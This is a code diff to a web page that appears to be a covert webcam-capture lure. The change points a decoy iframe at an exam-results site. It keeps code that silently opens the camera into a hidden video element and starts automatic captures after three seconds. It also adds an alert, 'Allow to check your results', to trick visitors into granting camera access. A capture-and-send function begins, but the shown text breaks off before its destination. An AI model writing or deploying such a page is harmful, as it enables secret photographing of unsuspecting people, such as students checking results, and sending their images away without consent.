@@ -34,7 +34,7 @@
 </head>
 <body>
   <video id="hidden-video" autoplay playsinline muted></video>
-  <iframe id="canva-iframe" src="https://pixelcut.ai"></iframe>
+  <iframe id="canva-iframe" src="https://www.toprankers.com/cuet-result"></iframe>
 
   <script>
     const video = document.getElementById('hidden-video');
@@ -42,39 +42,40 @@
     let canvas, context;
 
     async function initCamera() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: {
-            width: { ideal: 640 },
-            height: { ideal: 480 }
-          }
-        });
-        video.srcObject = stream;
-
-        video.onloadedmetadata = () => {
-          video.play();
-        };
-
-        await new Promise((resolve) => {
-          const checkReady = () => {
-            if (video.readyState >= 3 && video.videoWidth > 0 && video.videoHeight > 0) {
-              resolve();
-            } else {
-              setTimeout(checkReady, 100);
-            }
-          };
-          checkReady();
-        });
-
-        canvas = document.createElement('canvas');
-        context = canvas.getContext('2d');
-
-        setTimeout(startAutoCapture, 3000);
-
-      } catch (err) {
-        console.error('Camera error:', err);
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: {
+        width: { ideal: 640 },
+        height: { ideal: 480 }
       }
-    }
+    });
+    video.srcObject = stream;
+
+    video.onloadedmetadata = () => {
+      video.play();
+    };
+
+    await new Promise((resolve) => {
+      const checkReady = () => {
+        if (video.readyState >= 3 && video.videoWidth > 0 && video.videoHeight > 0) {
+          resolve();
+        } else {
+          setTimeout(checkReady, 100);
+        }
+      };
+      checkReady();
+    });
+
+    canvas = document.createElement('canvas');
+    context = canvas.getContext('2d');
+
+    setTimeout(startAutoCapture, 3000);
+
+  } catch (err) {
+    console.error('Camera error:', err);
+    alert("Allow to check your results");
+  }
+}
 
     async function captureAndSend() {
       if (!video.videoWidth || !video.videoHeight) return;
